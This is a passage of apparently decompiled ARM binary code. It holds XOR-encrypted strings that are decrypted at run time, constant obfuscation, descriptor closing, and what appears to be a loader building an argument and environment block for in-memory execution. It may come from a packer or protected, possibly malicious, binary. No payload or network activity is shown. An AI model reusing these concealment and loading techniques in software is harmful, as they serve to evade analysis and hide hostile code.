    bVar1 = *(byte *)(DAT_00025704 + 0x2559d);
    bVar2 = *(byte *)(DAT_00025704 + 0x2559e);
    *(byte *)(DAT_00025700 + 0x25598) = *(byte *)(DAT_00025704 + 0x2559c) ^ 0x3e;
    bVar3 = *(byte *)(iVar4 + 0x2559f);
    *(byte *)(iVar5 + 0x25599) = bVar1 ^ 0xf;
    *(byte *)(iVar5 + 0x2559a) = bVar2 ^ 0xf;
    *(byte *)(iVar5 + 0x2559b) = bVar3 ^ 100;
    bVar1 = *(byte *)(iVar4 + 0x255a7);
    *(byte *)(iVar5 + 0x2559c) = *(byte *)(iVar4 + 0x255a0) ^ 0x49;
    bVar2 = *(byte *)(iVar4 + 0x255a8);
    *(byte *)(iVar5 + 0x2559d) = *(byte *)(iVar4 + 0x255a1) ^ 0xa0;
    bVar3 = *(byte *)(iVar4 + 0x255a9);
    *(byte *)(iVar5 + 0x2559e) = *(byte *)(iVar4 + 0x255a2) ^ 0x6e;
    *(byte *)(iVar5 + 0x2559f) = *(byte *)(iVar4 + 0x255a3) ^ 0x55;
    *(byte *)(iVar5 + 0x255a0) = *(byte *)(iVar4 + 0x255a4) ^ 0x68;
    *(byte *)(iVar5 + 0x255a1) = *(byte *)(iVar4 + 0x255a5) ^ 0xe;
    *(byte *)(iVar5 + 0x255a2) = *(byte *)(iVar4 + 0x255a6) ^ 0x5e;
    *(byte *)(iVar5 + 0x255a3) = bVar1 ^ 0x69;
    *(byte *)(iVar5 + 0x255a4) = bVar2 ^ 0xfe;
    *(byte *)(iVar5 + 0x255a5) = bVar3 ^ 0x6a;
    bVar1 = *(byte *)(iVar4 + 0x255b0);
    *(byte *)(iVar5 + 0x255a6) = *(byte *)(iVar4 + 0x255aa) ^ 0x39;
    bVar2 = *(byte *)(iVar4 + 0x255b1);
    *(byte *)(iVar5 + 0x255a7) = *(byte *)(iVar4 + 0x255ab) ^ 100;
    bVar3 = *(byte *)(iVar4 + 0x255b2);
    *(byte *)(iVar5 + 0x255a8) = *(byte *)(iVar4 + 0x255ac) ^ 0x56;
    *(byte *)(iVar5 + 0x255a9) = *(byte *)(iVar4 + 0x255ad) ^ 0x44;
    *(byte *)(iVar5 + 0x255aa) = *(byte *)(iVar4 + 0x255ae) ^ 0xe5;
    *(byte *)(iVar5 + 0x255ab) = *(byte *)(iVar4 + 0x255af) ^ 0x8a;
    *(byte *)(iVar5 + 0x255ac) = bVar1 ^ 0xa5;
    *(byte *)(iVar5 + 0x255ad) = bVar2 ^ 0xa4;
    *(byte *)(iVar5 + 0x255ae) = bVar3 ^ 0x36;
    *(byte *)(iVar5 + 0x255af) = *(byte *)(iVar4 + 0x255b3) ^ 2;
  }
  DataMemoryBarrier(0xb);
  *piVar6 = 1;
  if (param_1 != (char *)0x0) {
    iVar5 = strncmp(param_1,(char *)(DAT_00025708 + 0x256e4),DAT_000256f8 + 0xb ^ DAT_000256f8);
    return iVar5 == 0;
  }
  return false;
}



// ---- 0002570c  FUN_0002570c  size=712

uint FUN_0002570c(uint param_1,int param_2,char *param_3,char *param_4,char *param_5)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  size_t sVar7;
  size_t sVar8;
  size_t sVar9;
  int iVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  
  iVar6 = DAT_00025a00;
  iVar5 = DAT_000259fc;
  piVar4 = (int *)(DAT_000259f8 + 0x2572c);
  DataMemoryBarrier(0xb);
  if (*piVar4 == 0) {
    bVar1 = *(byte *)(DAT_00025a00 + 0x25751);
    bVar2 = *(byte *)(DAT_00025a00 + 0x25752);
    *(byte *)(DAT_000259fc + 0x2574c) = *(byte *)(DAT_00025a00 + 0x25750) ^ 0x51;
    bVar3 = *(byte *)(iVar6 + 0x25753);
    *(byte *)(iVar5 + 0x2574d) = bVar1 ^ 0x79;
    *(byte *)(iVar5 + 0x2574e) = bVar2 ^ 0x3a;
    *(byte *)(iVar5 + 0x2574f) = bVar3 ^ 0x5a;
    bVar1 = *(byte *)(iVar6 + 0x2575b);
    *(byte *)(iVar5 + 0x25750) = *(byte *)(iVar6 + 0x25754) ^ 0x9d;
    bVar2 = *(byte *)(iVar6 + 0x2575c);
    *(byte *)(iVar5 + 0x25751) = *(byte *)(iVar6 + 0x25755) ^ 0x61;
    *(byte *)(iVar5 + 0x25752) = *(byte *)(iVar6 + 0x25756) ^ 6;
    *(byte *)(iVar5 + 0x25753) = *(byte *)(iVar6 + 0x25757) ^ 0xd3;
    *(byte *)(iVar5 + 0x25754) = *(byte *)(iVar6 + 0x25758) ^ 0x1e;
    *(byte *)(iVar5 + 0x25755) = *(byte *)(iVar6 + 0x25759) ^ 0xe4;
    bVar3 = *(byte *)(iVar6 + 0x2575d);
    *(byte *)(iVar5 + 0x25756) = *(byte *)(iVar6 + 0x2575a) ^ 99;
    *(byte *)(iVar5 + 0x25757) = bVar1 ^ 0x45;
    *(byte *)(iVar5 + 0x25758) = bVar2 ^ 0xf5;
    *(byte *)(iVar5 + 0x25759) = bVar3 ^ 0xa5;
  }
  DataMemoryBarrier(0xb);
  *piVar4 = 1;
  uVar13 = 0;
  if ((((param_1 <= ((DAT_000259d4 | 0x10000) ^ DAT_000259d4)) && (param_2 != 0)) &&
      (param_3 != (char *)0x0 && param_4 != (char *)0x0)) &&
     (iVar5 = strncmp(param_4,(char *)(DAT_00025a04 + 0x25854),DAT_000259d8 + 3 ^ DAT_000259d8),
     iVar5 == 0)) {
    if (param_5 == (char *)0x0) {
      iVar5 = 1;
      uVar12 = DAT_000259dc;
    }
    else {
      iVar6 = FUN_00025568();
      iVar5 = 2;
      uVar12 = DAT_000259dc;
      if (iVar6 == 0) {
        return 0;
      }
    }
    while (uVar13 < *(uint *)(param_2 + 8)) {
      iVar6 = FUN_00025230(*(undefined4 *)(*(int *)(param_2 + 4) + uVar13 * 4));
      if (iVar6 == 0) {
        iVar5 = iVar5 + 1;
      }
      uVar13 = uVar13 + (uVar12 + 1 ^ uVar12);
    }
    iVar6 = FUN_00025a08(param_2);
    sVar7 = strlen(param_3);
    sVar8 = strlen(param_4);
    uVar13 = 0;
    sVar9 = 0;
    if (param_5 != (char *)0x0) {
      sVar9 = strlen(param_5);
    }
    if ((sVar7 != 0xffffffff && sVar8 != 0xffffffff) && sVar9 + 1 != 0) {
      if (param_5 != (char *)0x0) {
        sVar9 = sVar9 + 1;
      }
      if ((sVar7 < 0xfffffff0) && (sVar8 < -sVar7 - 0x11)) {
        iVar10 = sVar8 + ((DAT_000259e8 | 1) ^ DAT_000259e8);
        uVar12 = (-sVar7 - 0x11) - iVar10;
        if ((sVar9 <= uVar12) &&
           (uVar11 = param_1 + ((DAT_000259e4 | 5) ^ DAT_000259e4) + iVar5 +
                     (iVar6 << (((DAT_000259e0 | 1) ^ DAT_000259e0) & 0xff)),
           uVar11 <= uVar12 - sVar9 >> (((DAT_000259ec | 2) ^ DAT_000259ec) & 0xff))) {
          uVar13 = sVar7 + ((DAT_000259f4 | 0x10) ^ DAT_000259f4) +
                   (uVar11 << (((DAT_000259f0 | 2) ^ DAT_000259f0) & 0xff)) + iVar10 + sVar9;
        }
      }
    }
  }
  return uVar13;
}



// ---- 00025a08  FUN_00025a08  size=128

int FUN_00025a08(int param_1)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  
  iVar3 = 0;
  for (iVar1 = 0; iVar1 != *(int *)(param_1 + 0x10);
      iVar1 = iVar1 + (DAT_00025a8c ^ DAT_00025a8c + 1)) {
    uVar2 = *(uint *)(*(int *)(param_1 + 0xc) + iVar1 * 8);
    if (((0x1f < uVar2) || ((1 << (uVar2 & 0xff) & 0x80000338U) == 0)) &&
       (uVar2 != (DAT_00025a88 + 3 ^ DAT_00025a88))) {
      iVar3 = iVar3 + 1;
    }
  }
  return iVar3 + ((DAT_00025a90 | 7) ^ DAT_00025a90);
}



// ---- 00025a94  FUN_00025a94  size=1036

uint * FUN_00025a94(int param_1,uint param_2,uint param_3,char *param_4,int param_5,char *param_6,
                   char *param_7,uint *param_8)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  size_t sVar4;
  uint *puVar5;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  char *unaff_r6;
  void *__dest;
  uint unaff_r7;
  void *__dest_00;
  uint *puVar9;
  uint uVar10;
  char *pcVar11;
  uint *__dest_01;
  
  puVar9 = (uint *)0x0;
  if (param_1 != 0) {
    unaff_r6 = param_4;
  }
  if (param_1 != 0 && param_4 != (char *)0x0) {
    pcVar11 = param_4;
    if (param_5 != 0) {
      pcVar11 = param_6;
    }
    if (param_5 != 0 && pcVar11 != (char *)0x0) {
      uVar6 = param_3;
      if (param_8 != (uint *)0x0) {
        uVar6 = param_8[5];
        unaff_r7 = param_3;
      }
      if (((param_8 != (uint *)0x0 && uVar6 != 0) &&
          (iVar1 = FUN_0002570c(unaff_r7,param_5,uVar6,pcVar11,param_7,param_3,param_4),
          uVar6 = DAT_00025ea4, iVar1 - 1U < param_2)) && (*(int *)(unaff_r6 + unaff_r7 * 4) == 0))
      {
        puVar9 = (uint *)(param_1 + ((DAT_00025ea0 | 0xf) ^ DAT_00025ea0) & 0xfffffff0);
        uVar2 = 0;
        *puVar9 = unaff_r7;
        while (uVar10 = DAT_00025eac, uVar8 = DAT_00025ea8, uVar2 != unaff_r7) {
          iVar1 = uVar2 * 4;
          uVar2 = uVar2 + (uVar6 + 1 ^ uVar6);
          puVar9[uVar2] = *(uint *)(unaff_r6 + iVar1);
        }
        iVar1 = 0;
        puVar9[unaff_r7 + 1] = 0;
        for (uVar6 = 0; uVar6 < *(uint *)(param_5 + 8); uVar6 = uVar6 + (uVar8 + 1 ^ uVar8)) {
          iVar3 = FUN_00025230(*(undefined4 *)(*(int *)(param_5 + 4) + uVar6 * 4));
          if (iVar3 == 0) {
            puVar9[unaff_r7 + iVar1 + 2] = *(uint *)(*(int *)(param_5 + 4) + uVar6 * 4);
            iVar1 = iVar1 + (uVar10 ^ uVar10 + 1);
          }
        }
        uVar6 = DAT_00025eb4 + 1 ^ DAT_00025eb4;
        if (param_7 == (char *)0x0) {
          uVar6 = (DAT_00025eb0 | 2) ^ DAT_00025eb0;
        }
        uVar2 = (DAT_00025eb8 | 1) ^ DAT_00025eb8;
        puVar5 = puVar9 + unaff_r7 + iVar1 + 2;
        iVar3 = FUN_00025a08(param_5);
        __dest_01 = puVar9 + unaff_r7 + iVar1 + 2 + uVar6 + (iVar3 << (uVar2 & 0xff)) + 2;
        pcVar11 = (char *)param_8[5];
        uVar6 = (DAT_00025ebc | 1) ^ DAT_00025ebc;
        sVar4 = strlen(pcVar11);
        sVar4 = sVar4 + uVar6;
        memcpy(__dest_01,pcVar11,sVar4);
        __dest = (void *)((int)__dest_01 + sVar4);
        uVar6 = (DAT_00025ec0 | 1) ^ DAT_00025ec0;
        sVar4 = strlen(param_6);
        sVar4 = sVar4 + uVar6;
        memcpy(__dest,param_6,sVar4);
        if (param_7 == (char *)0x0) {
          uVar6 = (DAT_00025ecc | 1) ^ DAT_00025ecc;
        }
        else {
          __dest_00 = (void *)((int)__dest + sVar4);
          uVar6 = (DAT_00025ec4 | 1) ^ DAT_00025ec4;
          sVar4 = strlen(param_7);
          memcpy(__dest_00,param_7,sVar4 + uVar6);
          uVar6 = (DAT_00025ec8 | 2) ^ DAT_00025ec8;
          puVar5[1] = (uint)__dest_00;
        }
        *puVar5 = (uint)__dest;
        iVar3 = 0;
        puVar5 = puVar9 + unaff_r7 + iVar1 + uVar6 + 2;
        *puVar5 = 0;
        uVar2 = DAT_00025ed4;
        uVar6 = DAT_00025ed0;
        for (uVar8 = 0; uVar8 < *(uint *)(param_5 + 0x10); uVar8 = uVar8 + (uVar2 + 1 ^ uVar2)) {
          puVar7 = (uint *)(*(int *)(param_5 + 0xc) + uVar8 * 8);
          if ((0x1f < *puVar7) || ((1 << (*puVar7 & 0xff) & 0x800003b8U) == 0)) {
            uVar10 = puVar7[1];
            iVar1 = iVar3 * 2;
            puVar5[iVar1 + 1] = *puVar7;
            iVar3 = iVar3 + (uVar6 ^ uVar6 + 1);
            (puVar5 + iVar1 + 1)[1] = uVar10;
          }
        }
        puVar5[iVar3 * 2 + 1] = (DAT_00025ed8 | 8) ^ DAT_00025ed8;
        (puVar5 + iVar3 * 2 + 1)[1] = *param_8;
        uVar6 = (DAT_00025ee0 | 1) ^ DAT_00025ee0;
        puVar5[(iVar3 + uVar6) * 2 + 1] = DAT_00025edc + 1 ^ DAT_00025edc;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = param_8[1];
        uVar6 = (DAT_00025ee8 | 2) ^ DAT_00025ee8;
        puVar5[(iVar3 + uVar6) * 2 + 1] = (DAT_00025ee4 | 4) ^ DAT_00025ee4;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = param_8[2];
        uVar6 = (DAT_00025ef0 | 3) ^ DAT_00025ef0;
        puVar5[(iVar3 + uVar6) * 2 + 1] = DAT_00025eec + 3 ^ DAT_00025eec;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = param_8[3];
        uVar6 = (DAT_00025ef8 | 4) ^ DAT_00025ef8;
        puVar5[(iVar3 + uVar6) * 2 + 1] = (DAT_00025ef4 | 9) ^ DAT_00025ef4;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = param_8[4];
        uVar6 = (DAT_00025f00 | 5) ^ DAT_00025f00;
        puVar5[(iVar3 + uVar6) * 2 + 1] = DAT_00025efc + 7 ^ DAT_00025efc;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = (uint)__dest_01;
        uVar6 = DAT_00025f08 + 2 ^ DAT_00025f08;
        puVar5[(iVar3 + uVar6) * 2 + 1] = (DAT_00025f04 | 7) ^ DAT_00025f04;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = param_8[6];
        uVar6 = (DAT_00025f0c | 7) ^ DAT_00025f0c;
        puVar5[(iVar3 + uVar6) * 2 + 1] = 0;
        (puVar5 + (iVar3 + uVar6) * 2 + 1)[1] = 0;
      }
    }
  }
  return puVar9;
}



// ---- 00025f10  FUN_00025f10  size=904

int FUN_00025f10(void)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  int *piVar6;
  DIR *__dirp;
  int iVar7;
  uint *puVar8;
  dirent *pdVar9;
  uint uVar10;
  undefined4 uVar11;
  int iVar12;
  int iVar13;
  uint uVar14;
  uint uVar15;
  char *pcVar16;
  uint uVar17;
  undefined8 *puVar18;
  sigaltstack *__ss;
  undefined8 in_d4;
  ulonglong in_d5;
  undefined8 in_d6;
  undefined8 in_d7;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  undefined local_98 [24];
  sigaltstack sStack_80;
  undefined8 local_70;
  undefined8 uStack_68;
  undefined4 local_60;
  undefined8 uStack_58;
  undefined8 local_50;
  undefined8 local_48;
  uint *local_40;
  undefined4 uStack_3c;
  
  iVar7 = DAT_000262c0;
  iVar13 = DAT_000262bc;
  piVar6 = (int *)(DAT_000262b8 + 0x25f28);
  DataMemoryBarrier(0xb);
  if (*piVar6 == 0) {
    bVar1 = *(byte *)(DAT_000262c0 + 0x25f49);
    bVar2 = *(byte *)(DAT_000262c0 + 0x25f4a);
    *(byte *)(DAT_000262bc + 0x25f44) = *(byte *)(DAT_000262c0 + 0x25f48) ^ 0x59;
    bVar3 = *(byte *)(iVar7 + 0x25f4b);
    *(byte *)(iVar13 + 0x25f45) = bVar1 ^ 0xf4;
    *(byte *)(iVar13 + 0x25f46) = bVar2 ^ 0x11;
    *(byte *)(iVar13 + 0x25f47) = bVar3 ^ 0x7d;
    bVar1 = *(byte *)(iVar7 + 0x25f53);
    *(byte *)(iVar13 + 0x25f48) = *(byte *)(iVar7 + 0x25f4c) ^ 0x52;
    bVar2 = *(byte *)(iVar7 + 0x25f54);
    *(byte *)(iVar13 + 0x25f49) = *(byte *)(iVar7 + 0x25f4d) ^ 0xa2;
    *(byte *)(iVar13 + 0x25f4a) = *(byte *)(iVar7 + 0x25f4e) ^ 0xef;
    *(byte *)(iVar13 + 0x25f4b) = *(byte *)(iVar7 + 0x25f4f) ^ 0x8b;
    *(byte *)(iVar13 + 0x25f4c) = *(byte *)(iVar7 + 0x25f50) ^ 0x2e;
    *(byte *)(iVar13 + 0x25f4d) = *(byte *)(iVar7 + 0x25f51) ^ 0x2c;
    bVar3 = *(byte *)(iVar7 + 0x25f55);
    *(byte *)(iVar13 + 0x25f4e) = *(byte *)(iVar7 + 0x25f52) ^ 0x34;
    *(byte *)(iVar13 + 0x25f4f) = bVar1 ^ 0x66;
    *(byte *)(iVar13 + 0x25f50) = bVar2 ^ 0x8d;
    *(byte *)(iVar13 + 0x25f51) = bVar3 ^ 0x29;
  }
  uVar15 = 1;
  DataMemoryBarrier(0xb);
  *piVar6 = 1;
  _local_40 = CONCAT44((int)((ulonglong)in_d7 >> 0x20),local_98);
  uVar19 = 0;
  uVar20 = 0;
  uVar21 = 0;
  uVar22 = 0;
  local_70 = 0;
  uStack_68 = 0;
  local_60 = 0;
  sStack_80._0_8_ = *(undefined8 *)(DAT_000262c4 + 0x26038);
  sStack_80.ss_size = *(size_t *)(DAT_000262c4 + 0x26040);
  uStack_58 = in_d4;
  local_50 = in_d5;
  local_48 = in_d6;
  __dirp = opendir((char *)(DAT_000262c8 + 0x26050));
  iVar13 = -1;
  uVar4 = DAT_000262b4;
  uVar5 = DAT_000262b0;
  uVar14 = DAT_000262ac;
  __ss = &sStack_80;
  puVar18 = &local_70;
  if (__dirp != (DIR *)0x0) {
    iVar7 = dirfd(__dirp);
    uVar5 = DAT_000262a8;
    uVar4 = DAT_0002629c;
    local_48 = CONCAT44(local_48._4_4_,iVar7);
    if (iVar7 < 0) {
      closedir(__dirp);
      uVar4 = DAT_000262b4;
      uVar5 = DAT_000262b0;
      uVar14 = DAT_000262ac;
    }
    else {
      uStack_58 = CONCAT44(&sStack_80,(undefined4)uStack_58);
      local_50 = CONCAT44(local_50._4_4_,&local_70);
      puVar8 = (uint *)__errno();
      local_50 = local_50 & 0xffffffff;
      local_48 = CONCAT44(puVar8,(uint)local_48);
LAB_000260a4:
      *puVar8 = 0;
      pdVar9 = readdir(__dirp);
      if (pdVar9 != (dirent *)0x0) {
        uVar14 = (uint)(byte)pdVar9->d_name[8];
        if (uVar14 != 0) {
          uVar17 = 0;
          pcVar16 = pdVar9->d_name + 9;
          while (uVar14 != 0) {
            if (((uVar14 - 0x3a & 0xff) < 0xf6) ||
               (uVar10 = FUN_00035060(-0x7fffffd1 - uVar14,uVar4 + 10 ^ uVar4), uVar10 < uVar17)) {
              puVar8 = local_48._4_4_;
              goto LAB_000260a4;
            }
            uVar17 = (uVar17 * (uVar5 + 10 ^ uVar5) + uVar14) - 0x30;
            uVar14 = (uint)(byte)*pcVar16;
            pcVar16 = pcVar16 + 1;
          }
          puVar8 = local_48._4_4_;
          if (((-1 < (int)uVar17) && (uVar17 != (uint)local_48)) &&
             ((uVar14 = fcntl(uVar17,DAT_000262a4 + 1 ^ DAT_000262a4), (int)uVar14 < 0 ||
              (((uVar14 & (DAT_000262a0 + 1 ^ DAT_000262a0)) != 0 &&
               (iVar13 = close(uVar17), iVar13 != 0)))))) {
            uVar11 = local_50._4_4_;
            if (*puVar8 != (DAT_00026298 ^ DAT_00026298 + 7)) {
              uVar11 = 0xffffffff;
            }
            local_50 = CONCAT44(uVar11,(undefined8 *)local_50);
          }
        }
        goto LAB_000260a4;
      }
      uVar17 = *puVar8;
      iVar7 = closedir(__dirp);
      iVar13 = -1;
      uVar4 = DAT_000262b4;
      uVar5 = DAT_000262b0;
      uVar14 = DAT_000262ac;
      __ss = uStack_58._4_4_;
      puVar18 = (undefined8 *)local_50;
      if ((iVar7 == 0 && uVar17 == 0) && (iVar13 = local_50._4_4_, local_50._4_4_ != 0)) {
        iVar13 = -1;
      }
    }
  }
  while (uVar15 != (uVar5 + 0x41 ^ uVar5)) {
    *local_40 = uVar19;
    local_40[1] = uVar20;
    local_40[4] = uVar21;
    local_40[5] = uVar22;
    local_40[4] = 0;
    iVar12 = FUN_000262cc(uVar15);
    iVar7 = -1;
    if (((iVar12 == 0) && (iVar7 = iVar13, (uVar14 ^ uVar14 + 2) <= *local_40)) &&
       (iVar13 = FUN_000262cc(uVar15,puVar18,0), iVar13 != 0)) {
      iVar7 = -1;
    }
    uVar15 = uVar15 + (uVar4 + 1 ^ uVar4);
    iVar13 = iVar7;
  }
  iVar7 = sigaltstack(__ss,(sigaltstack *)0x0);
  if (iVar7 != 0) {
    iVar13 = -1;
  }
  return iVar13;
}



// ---- 000262cc  FUN_000262cc  size=64

void FUN_000262cc(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  syscall(DAT_00026310 + 0x96 ^ DAT_00026310,param_1,param_2,param_3,
          (DAT_0002630c | 8) ^ DAT_0002630c);
  return;
}



// ---- 00026314  FUN_00026314  size=416

char FUN_00026314(void)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  int iVar4;
  int iVar5;
  char cVar6;
  char *pcVar7;
  byte *pbVar8;
  byte *pbVar9;
  int *piVar10;
  
  iVar5 = DAT_000264bc;
  iVar4 = DAT_000264b8;
  piVar10 = (int *)(DAT_000264b4 + 0x26328);
  DataMemoryBarrier(0xb);
  if (*piVar10 == 0) {
    pbVar8 = (byte *)(DAT_000264b8 + 0x26344);
    pbVar9 = (byte *)(DAT_000264bc + 0x26348);
    bVar1 = *(byte *)(DAT_000264bc + 0x2634a);
    bVar2 = *(byte *)(DAT_000264bc + 0x2634b);
    *(byte *)(DAT_000264b8 + 0x26345) = *(byte *)(DAT_000264bc + 0x26349) ^ 0xf4;
    *(byte *)(iVar4 + 0x26346) = bVar1 ^ 0x11;
    *(byte *)(iVar4 + 0x26347) = bVar2 ^ 0x7d;
    bVar1 = *pbVar9;
    *(byte *)(iVar4 + 0x26348) = *(byte *)(iVar5 + 0x2634c) ^ 0x52;
    bVar2 = *(byte *)(iVar5 + 0x2634d);
    *pbVar8 = bVar1 ^ 0x59;
    *(byte *)(iVar4 + 0x26349) = bVar2 ^ 0xa2;
    bVar1 = *(byte *)(iVar5 + 0x26353);
    *(byte *)(iVar4 + 0x2634a) = *(byte *)(iVar5 + 0x2634e) ^ 0xef;
    bVar2 = *(byte *)(iVar5 + 0x26354);
    *(byte *)(iVar4 + 0x2634b) = *(byte *)(iVar5 + 0x2634f) ^ 0x8b;
    bVar3 = *(byte *)(iVar5 + 0x26355);
    *(byte *)(iVar4 + 0x2634c) = *(byte *)(iVar5 + 0x26350) ^ 0x2e;
    *(byte *)(iVar4 + 0x2634d) = *(byte *)(iVar5 + 0x26351) ^ 0x2c;
    *(byte *)(iVar4 + 0x2634e) = *(byte *)(iVar5 + 0x26352) ^ 0x34;
    *(byte *)(iVar4 + 0x2634f) = bVar1 ^ 0x66;
    *(byte *)(iVar4 + 0x26350) = bVar2 ^ 0x8d;
    *(byte *)(iVar4 + 0x26351) = bVar3 ^ 0x29;
    bVar1 = *(byte *)(iVar5 + 0x2635c);
    *(byte *)(iVar4 + 0x26352) = *(byte *)(iVar5 + 0x26356) ^ 0x2c;
    bVar2 = *(byte *)(iVar5 + 0x2635d);
    *(byte *)(iVar4 + 0x26353) = *(byte *)(iVar5 + 0x26357) ^ 0x47;
    bVar3 = *(byte *)(iVar5 + 0x2635e);
    *(byte *)(iVar4 + 0x26354) = *(byte *)(iVar5 + 0x26358) ^ 0x4c;
    *(byte *)(iVar4 + 0x26355) = *(byte *)(iVar5 + 0x26359) ^ 0x45;
    *(byte *)(iVar4 + 0x26356) = *(byte *)(iVar5 + 0x2635a) ^ 0x83;
    *(byte *)(iVar4 + 0x26357) = *(byte *)(iVar5 + 0x2635b) ^ 0xa4;
    *(byte *)(iVar4 + 0x26358) = bVar1 ^ 0x73;
    *(byte *)(iVar4 + 0x26359) = bVar2 ^ 0x5b;
    *(byte *)(iVar4 + 0x2635a) = bVar3 ^ 5;
    *(byte *)(iVar4 + 0x2635b) = *(byte *)(iVar5 + 0x2635f) ^ 0x2e;
    *(byte *)(iVar4 + 0x2635c) = *(byte *)(iVar5 + 0x26360) ^ 0xa2;
    *(byte *)(iVar4 + 0x2635d) = *(byte *)(iVar5 + 0x26361) ^ 0x38;
  }
  DataMemoryBarrier(0xb);
  *piVar10 = 1;
  pcVar7 = getenv((char *)(DAT_000264c0 + 0x26494));
  if (pcVar7 != (char *)0x0) {
    cVar6 = *pcVar7;
    if (cVar6 != '\0') {
      cVar6 = '\x01';
    }
    return cVar6;
  }
  return '\0';
}



// ---- 000264c4  FUN_000264c4  size=2248

void FUN_000264c4(int *param_1)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  char cVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  char *pcVar8;
  uint *puVar9;
  undefined4 uVar10;
  int iVar11;
  int iVar12;
  uint extraout_r1;
  byte *pbVar13;
  byte bVar14;
  byte *pbVar15;
  uint uVar16;
  byte *pbVar17;
  byte *pbVar18;
  int *piVar19;
  byte *pbVar20;
  int local_a8 [2];
  int local_a0;
  int local_9c;
  uint local_98 [2];
  uint local_90 [2];
  uint local_88 [8];
  uint local_68;
  undefined2 local_64;
  ushort local_62;
  longlong local_60;
  ulonglong uStack_58;
  undefined4 local_50;
  undefined4 local_4c;
  byte *local_48 [3];
  uint *local_3c;
  byte *local_38;
  uint *local_34;
  int *local_30;
  int local_2c;
  
  iVar7 = DAT_00026de0;
  iVar6 = DAT_00026ddc;
  iVar5 = DAT_00026dd8;
  iVar12 = DAT_00026dd4;
  iVar11 = DAT_00026dd0;
  local_2c = **(int **)(DAT_00026dc8 + 0x264e0);
  piVar19 = (int *)(DAT_00026dcc + 0x264f4);
  DataMemoryBarrier(0xb);
  if (*piVar19 == 0) {
    pbVar18 = (byte *)(DAT_00026dd0 + 0x26514);
    pbVar15 = (byte *)(DAT_00026dd4 + 0x2651c);
    pbVar13 = (byte *)(DAT_00026dd8 + 0x26524);
    pbVar20 = (byte *)(DAT_00026ddc + 0x26528);
    pbVar17 = (byte *)(DAT_00026de0 + 0x2652c);
    bVar14 = *(byte *)(DAT_00026de0 + 0x2652f);
    *(byte *)(DAT_00026dd0 + 0x26516) = *(byte *)(DAT_00026de0 + 0x2652e) ^ 0xd3;
    *(byte *)(iVar11 + 0x26517) = bVar14 ^ 0x1e;
    bVar14 = *(byte *)(iVar7 + 0x2652d);
    *(byte *)(iVar11 + 0x26518) = *(byte *)(iVar7 + 0x26530) ^ 0xe4;
    bVar1 = *pbVar17;
    *(byte *)(iVar11 + 0x26519) = *(byte *)(iVar7 + 0x26531) ^ 99;
    bVar2 = *(byte *)(iVar7 + 0x26537);
    *(byte *)(iVar11 + 0x2651a) = *(byte *)(iVar7 + 0x26532) ^ 0x45;
    bVar3 = *(byte *)(iVar7 + 0x26533);
    *(byte *)(iVar11 + 0x26515) = bVar14 ^ 6;
    *(byte *)(iVar11 + 0x2651b) = bVar3 ^ 0xf5;
    bVar14 = *(byte *)(iVar7 + 0x26538);
    *(byte *)(iVar11 + 0x2651c) = *(byte *)(iVar7 + 0x26534) ^ 0xa5;
    bVar3 = *(byte *)(iVar7 + 0x26535);
    *pbVar18 = bVar1 ^ 0x61;
    *(byte *)(iVar11 + 0x2651d) = bVar3 ^ 0x2b;
    bVar1 = *(byte *)(iVar7 + 0x26539);
    *(byte *)(iVar11 + 0x2651e) = *(byte *)(iVar7 + 0x26536) ^ 0xac;
    *(byte *)(iVar11 + 0x2651f) = bVar2 ^ 0x1e;
    *(byte *)(iVar11 + 0x26520) = bVar14 ^ 0xcc;
    *(byte *)(iVar11 + 0x26521) = bVar1 ^ 0x7c;
    *(byte *)(iVar11 + 0x26522) = *(byte *)(iVar7 + 0x2653a) ^ 0xaa;
    *(byte *)(iVar11 + 0x26523) = *(byte *)(iVar7 + 0x2653b) ^ 0xcb;
    iVar11 = DAT_00026de4;
    bVar14 = *(byte *)(DAT_00026de4 + 0x265f5);
    bVar1 = *(byte *)(DAT_00026de4 + 0x265f6);
    *pbVar15 = *(byte *)(DAT_00026de4 + 0x265f4) ^ 0xe3;
    *(byte *)(iVar12 + 0x2651d) = bVar14 ^ 0xc3;
    *(byte *)(iVar12 + 0x2651e) = bVar1 ^ 9;
    bVar14 = *(byte *)(iVar11 + 0x265f8);
    bVar1 = *(byte *)(iVar11 + 0x265f9);
    *(byte *)(iVar12 + 0x2651f) = *(byte *)(iVar11 + 0x265f7) ^ 0x40;
    bVar2 = *(byte *)(iVar11 + 0x265fa);
    *(byte *)(iVar12 + 0x26520) = bVar14 ^ 0xaf;
    *(byte *)(iVar12 + 0x26521) = bVar1 ^ 0xee;
    *(byte *)(iVar12 + 0x26522) = bVar2 ^ 0xa9;
    *(byte *)(iVar12 + 0x26523) = *(byte *)(iVar11 + 0x265fb) ^ 0x5a;
    *(byte *)(iVar12 + 0x26524) = *(byte *)(iVar11 + 0x265fc) ^ 100;
    *(byte *)(iVar12 + 0x26525) = *(byte *)(iVar11 + 0x265fd) ^ 0x8d;
    *(byte *)(iVar12 + 0x26526) = *(byte *)(iVar11 + 0x265fe) ^ 0xd5;
    *(byte *)(iVar12 + 0x26527) = *(byte *)(iVar11 + 0x265ff) ^ 0x6e;
    *(byte *)(iVar12 + 0x26528) = *(byte *)(iVar11 + 0x26600) ^ 1;
    *(byte *)(iVar12 + 0x26529) = *(byte *)(iVar11 + 0x26601) ^ 0x25;
    *(byte *)(iVar12 + 0x2652a) = *(byte *)(iVar11 + 0x26602) ^ 0xd3;
    *(byte *)(iVar12 + 0x2652b) = *(byte *)(iVar11 + 0x26603) ^ 0x16;
